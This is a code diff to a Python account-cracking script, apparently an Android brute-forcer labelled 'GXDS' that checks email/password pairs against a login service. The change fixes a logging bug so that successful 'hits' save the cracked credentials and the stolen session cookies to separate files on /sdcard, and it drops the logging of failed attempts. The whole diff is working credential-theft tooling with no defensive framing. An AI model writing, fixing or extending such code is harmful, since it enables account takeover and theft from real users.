@@ -597,23 +597,17 @@ def gxds_files(uid, pxss):
                         for key, value in session.cookies.get_dict().items()
                     ]
                 )
-                output = print(f"""{lgr} -- [GXDS HITS] --
+                print(f"""{lgr} -- [GXDS HITS] --
  EMAIL  : {uid} 
  PASS   : {ps} 
  JOINED : {yrs}
  COOKIE : {coki}
 """)
-                open("/sdcard/gxds-hits.txt", "a").write(output + "\n")
+                open("/sdcard/gxds-ok.txt", "a").write(uid + "|" + ps + "\n")
+                open("/sdcard/gxds-cookies.txt", "a").write(coki + "\n")
                 oks.append(uid)
                 break
             else:
-              output = print(f"""{lr} -- [GXDS DEAD] --
- EMAIL  : {uid} 
- PASS   : {ps} 
- JOINED : {yrs}
- COOKIE : {coki}
-""")
-              open("/sdcard/gxds-dead.txt", "a").write(output + "\n")
               continue
         loop += 1
     except:
